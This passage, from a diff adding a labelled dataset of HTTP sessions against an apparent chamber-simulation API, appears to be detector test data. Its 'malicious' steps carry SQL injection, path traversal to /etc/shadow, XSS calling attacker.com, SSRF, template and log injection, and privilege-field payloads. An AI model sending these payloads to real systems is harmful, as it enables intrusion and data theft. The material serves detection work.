+          "method": "GET",
+          "path": "/chambers/cham-025",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenFGH"},
+          "body": null,
+          "note": "The client checks chamber cham-025."
+        }
+      ]
+    },
+    {
+      "session_id": "sess126",
+      "client_ip": "172.20.50.60",
+      "steps": [
+        {
+          "id": "sess126-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess126-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user26", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess126-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenIJK"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess126-s04",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/chambers/cham-unauthorized-99",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenIJK"},
+          "body": null,
+          "note": "Data error: relabeled from malicious. One authenticated GET. The word unauthorized is only part of the id string."
+        },
+        {
+          "id": "sess126-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-026",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenIJK"},
+          "body": null,
+          "note": "The client checks chamber cham-026."
+        }
+      ]
+    },
+    {
+      "session_id": "sess127",
+      "client_ip": "192.168.8.9",
+      "steps": [
+        {
+          "id": "sess127-s01",
+          "label": "suspicious_benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)"},
+          "body": {"username": "user27's_account", "password": "password"},
+          "note": "The client uses an old browser and an apostrophe in the username."
+        },
+        {
+          "id": "sess127-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenLMN"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess127-s03",
+          "label": "benign",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenLMN", "Content-Type": "application/json"},
+          "body": {"name": "Acoustic Chamber Beta", "volume_cubic_meters": 55.0},
+          "note": "The client creates a new chamber."
+        },
+        {
+          "id": "sess127-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-027",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenLMN"},
+          "body": null,
+          "note": "The client checks chamber cham-027."
+        }
+      ]
+    },
+    {
+      "session_id": "sess128",
+      "client_ip": "10.33.44.55",
+      "steps": [
+        {
+          "id": "sess128-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user28", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess128-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenOPQ"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess128-s03",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {"offset": "0; DROP TABLE chambers;--"},
+          "headers": {"Authorization": "Bearer tokenOPQ"},
+          "body": null,
+          "note": "The client performs a query injection in the offset parameter."
+        },
+        {
+          "id": "sess128-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-028",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenOPQ"},
+          "body": null,
+          "note": "The client checks chamber cham-028."
+        }
+      ]
+    },
+    {
+      "session_id": "sess129",
+      "client_ip": "172.22.33.44",
+      "steps": [
+        {
+          "id": "sess129-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess129-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user29", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess129-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenRST"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess129-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/admin/dashboard",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenRST"},
+          "body": null,
+          "note": "The client accesses an unauthorized admin path."
+        },
+        {
+          "id": "sess129-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-029",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenRST"},
+          "body": null,
+          "note": "The client checks chamber cham-029."
+        }
+      ]
+    },
+    {
+      "session_id": "sess130",
+      "client_ip": "192.168.9.11",
+      "steps": [
+        {
+          "id": "sess130-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user30", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess130-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenUVW"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess130-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenUVW", "Content-Type": "application/json"},
+          "body": {"name": "Chamber", "volume_cubic_meters": 10.0, "permissions": "root"},
+          "note": "The client injects a privileged permissions field."
+        },
+        {
+          "id": "sess130-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-030",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenUVW"},
+          "body": null,
+          "note": "The client checks chamber cham-030."
+        }
+      ]
+    },
+    {
+      "session_id": "sess131",
+      "client_ip": "10.44.55.66",
+      "steps": [
+        {
+          "id": "sess131-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess131-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user31", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess131-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess131-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers/../../config/settings.json",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ"},
+          "body": null,
+          "note": "The client performs directory traversal."
+        },
+        {
+          "id": "sess131-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-031",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ"},
+          "body": null,
+          "note": "The client checks chamber cham-031."
+        }
+      ]
+    },
+    {
+      "session_id": "sess132",
+      "client_ip": "172.24.55.66",
+      "steps": [
+        {
+          "id": "sess132-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user32", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess132-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess132-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC", "Content-Type": "application/json"},
+          "body": {"name": "<iframe src=javascript:alert(1)></iframe>", "volume_cubic_meters": 15.0},
+          "note": "The client passes browser-executed code."
+        },
+        {
+          "id": "sess132-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-032",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC"},
+          "body": null,
+          "note": "The client checks chamber cham-032."
+        }
+      ]
+    },
+    {
+      "session_id": "sess133",
+      "client_ip": "192.168.10.22",
+      "steps": [
+        {
+          "id": "sess133-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess133-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user33", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess133-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenDEF"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess133-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers/cham-033/simulate",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenDEF", "Content-Type": "application/json"},
+          "body": {"ambient_temperature_celsius": 20.0, "endpoint": "http://10.0.0.1/admin"},
+          "note": "The client passes an internal address."
+        },
+        {
+          "id": "sess133-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-033/simulations",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenDEF"},
+          "body": null,
+          "note": "The client checks simulation results."
+        }
+      ]
+    },
+    {
+      "session_id": "sess134",
+      "client_ip": "10.55.66.77",
+      "steps": [
+        {
+          "id": "sess134-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user34", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess134-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenGHI"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess134-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenGHI", "Content-Type": "application/json"},
+          "body": {"name": "{{self.__dict__}}", "volume_cubic_meters": 20.0},
+          "note": "The client injects a template expression."
+        },
+        {
+          "id": "sess134-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-034",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenGHI"},
+          "body": null,
+          "note": "The client checks chamber cham-034."
+        }
+      ]
+    },
+    {
+      "session_id": "sess135",
+      "client_ip": "172.26.77.88",
+      "steps": [
+        {
+          "id": "sess135-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess135-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user35", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess135-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess135-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL", "Content-Type": "application/json"},
+          "body": {"name": "rO0ABXNyACpvcmcu...", "volume_cubic_meters": 22.0},
+          "note": "The client passes a serialized object."
+        },
+        {
+          "id": "sess135-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-035",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL"},
+          "body": null,
+          "note": "The client checks chamber cham-035."
+        }
+      ]
+    },
+    {
+      "session_id": "sess136",
+      "client_ip": "192.168.12.34",
+      "steps": [
+        {
+          "id": "sess136-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user36", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess136-s02",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO", "Content-Type": "application/json"},
+          "body": {"name": "Chamber\n2026-10-28 12:00:00 [AUDIT] Unauthorized access", "volume_cubic_meters": 18.5},
+          "note": "The client passes a newline and a log stamp."
+        },
+        {
+          "id": "sess136-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess136-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-036",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO"},
+          "body": null,
+          "note": "The client checks chamber cham-036."
+        }
+      ]
+    },
+    {
+      "session_id": "sess137",
+      "client_ip": "10.66.77.88",
+      "steps": [
+        {
+          "id": "sess137-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess137-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user37", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess137-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenPQR"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess137-s04",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/chambers/cham-invalid-xyz",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenPQR"},
+          "body": null,
+          "note": "Data error: relabeled from malicious. An unknown chamber id is a normal read that should 404, not an attack."
+        },
+        {
+          "id": "sess137-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-037",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenPQR"},
+          "body": null,
+          "note": "The client checks chamber cham-037."
+        }
+      ]
+    },
+    {
+      "session_id": "sess138",
+      "client_ip": "172.28.99.11",
+      "steps": [
+        {
+          "id": "sess138-s01",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/materials",
+          "query": {},
+          "headers": {"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0)"},
+          "body": null,
+          "note": "The client accesses materials using an old browser header."
+        },
+        {
+          "id": "sess138-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user38", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess138-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenSTU"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess138-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-038",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenSTU"},
+          "body": null,
+          "note": "The client checks chamber cham-038."
+        }
+      ]
+    },
+    {
+      "session_id": "sess139",
+      "client_ip": "192.168.15.50",
+      "steps": [
+        {
+          "id": "sess139-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user39", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess139-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenVWX"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess139-s03",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {"limit": "10 UNION SELECT 1,2,3--"},
+          "headers": {"Authorization": "Bearer tokenVWX"},
+          "body": null,
+          "note": "The client injects a SQL union query."
+        },
+        {
+          "id": "sess139-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-039",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenVWX"},
+          "body": null,
+          "note": "The client checks chamber cham-039."
+        }
+      ]
+    },
+    {
+      "session_id": "sess140",
+      "client_ip": "10.77.88.99",
+      "steps": [
+        {
+          "id": "sess140-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess140-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user40", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess140-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenYZA"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess140-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/admin/settings",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenYZA"},
+          "body": null,
+          "note": "The client accesses an unauthorized admin path."
+        },
+        {
+          "id": "sess140-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-040",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenYZA"},
+          "body": null,
+          "note": "The client checks chamber cham-040."
+        }
+      ]
+    },
+    {
+      "session_id": "sess141",
+      "client_ip": "172.30.11.22",
+      "steps": [
+        {
+          "id": "sess141-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user41", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess141-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess141-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD", "Content-Type": "application/json"},
+          "body": {"name": "Lab", "volume_cubic_meters": 10.0, "is_superuser": true},
+          "note": "The client injects a privileged boolean field."
+        },
+        {
+          "id": "sess141-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-041",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD"},
+          "body": null,
+          "note": "The client checks chamber cham-041."
+        }
+      ]
+    },
+    {
+      "session_id": "sess142",
+      "client_ip": "192.168.20.5",
+      "steps": [
+        {
+          "id": "sess142-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess142-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user42", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess142-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenEFG"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess142-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers/../../etc/shadow",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenEFG"},
+          "body": null,
+          "note": "The client performs directory traversal."
+        },
+        {
+          "id": "sess142-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-042",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenEFG"},
+          "body": null,
+          "note": "The client checks chamber cham-042."
+        }
+      ]
+    },
+    {
+      "session_id": "sess143",
+      "client_ip": "10.88.99.11",
+      "steps": [
+        {
+          "id": "sess143-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user43", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess143-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenHIJ"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess143-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenHIJ", "Content-Type": "application/json"},
+          "body": {"name": "<script>fetch('http://attacker.com')</script>", "volume_cubic_meters": 15.0},
+          "note": "The client passes browser-executed code."
+        },
+        {
+          "id": "sess143-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-043",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenHIJ"},
+          "body": null,
+          "note": "The client checks chamber cham-043."
+        }
+      ]
+    },
+    {
+      "session_id": "sess144",
+      "client_ip": "172.32.44.55",
+      "steps": [
+        {
+          "id": "sess144-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess144-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user44", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess144-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenKLM"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess144-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers/cham-044/simulate",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenKLM", "Content-Type": "application/json"},
+          "body": {"ambient_temperature_celsius": 25.0, "server": "http://127.0.0.1:8080/admin"},
+          "note": "The client references an internal service address."
+        },
+        {
+          "id": "sess144-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-044/simulations",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenKLM"},
+          "body": null,
+          "note": "The client checks simulations."
+        }
+      ]
+    },
+    {
+      "session_id": "sess145",
+      "client_ip": "192.168.25.10",
+      "steps": [
+        {
+          "id": "sess145-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user45", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess145-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess145-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP", "Content-Type": "application/json"},
+          "body": {"name": "{{request.application}}", "volume_cubic_meters": 12.0},
+          "note": "The client injects a template expression."
+        },
+        {
+          "id": "sess145-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-045",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP"},
+          "body": null,
+          "note": "The client checks chamber cham-045."
+        }
+      ]
+    },
+    {
+      "session_id": "sess146",
+      "client_ip": "10.99.11.22",
+      "steps": [
+        {
+          "id": "sess146-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess146-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user46", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess146-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess146-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS", "Content-Type": "application/json"},
+          "body": {"name": "rO0ABXNyACpvcm...", "volume_cubic_meters": 16.0},
+          "note": "The client passes a serialized object payload."
+        },
+        {
+          "id": "sess146-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-046",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS"},
+          "body": null,
+          "note": "The client checks chamber cham-046."
+        }
+      ]
+    },
+    {
+      "session_id": "sess147",
+      "client_ip": "172.35.66.77",
+      "steps": [
+        {
+          "id": "sess147-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user47", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess147-s02",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenTUV", "Content-Type": "application/json"},
+          "body": {"name": "Chamber\n[WARN] 2026-10-28 Payload injection logged", "volume_cubic_meters": 22.0},
+          "note": "The client passes a newline and a log stamp."
+        },
+        {
+          "id": "sess147-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenTUV"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess147-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-047",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenTUV"},
+          "body": null,
+          "note": "The client checks chamber cham-047."
+        }
+      ]
+    },
+    {
+      "session_id": "sess148",
+      "client_ip": "192.168.30.15",
+      "steps": [
+        {
+          "id": "sess148-s01",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/materials",
+          "query": {},
+          "headers": {"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT)"},
+          "body": null,
+          "note": "The client uses an old browser signature."
+        },
+        {
+          "id": "sess148-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user48", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess148-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenWXY"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess148-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-048",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenWXY"},
+          "body": null,
+          "note": "The client checks chamber cham-048."
+        }
+      ]
+    },
+    {
+      "session_id": "sess149",
+      "client_ip": "10.111.22.33",
+      "steps": [
+        {
+          "id": "sess149-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user49", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess149-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenZAB"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess149-s03",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/chambers/cham-other-999",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenZAB"},
+          "body": null,
+          "note": "Data error: relabeled from malicious. One authenticated GET. Nothing in the request shows the chamber belongs to another user."
+        },
+        {
+          "id": "sess149-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-049",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenZAB"},
+          "body": null,
+          "note": "The client checks chamber cham-049."
+        }
+      ]
+    },
+    {
+      "session_id": "sess150",
+      "client_ip": "172.40.88.99",
+      "steps": [
+        {
+          "id": "sess150-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess150-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user50", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess150-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenCDE"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess150-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {"limit": "5 UNION SELECT version(),user()--"},
+          "headers": {"Authorization": "Bearer tokenCDE"},
+          "body": null,
+          "note": "The client performs a query injection."
+        },
+        {
+          "id": "sess150-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-050",
+          "query": {},
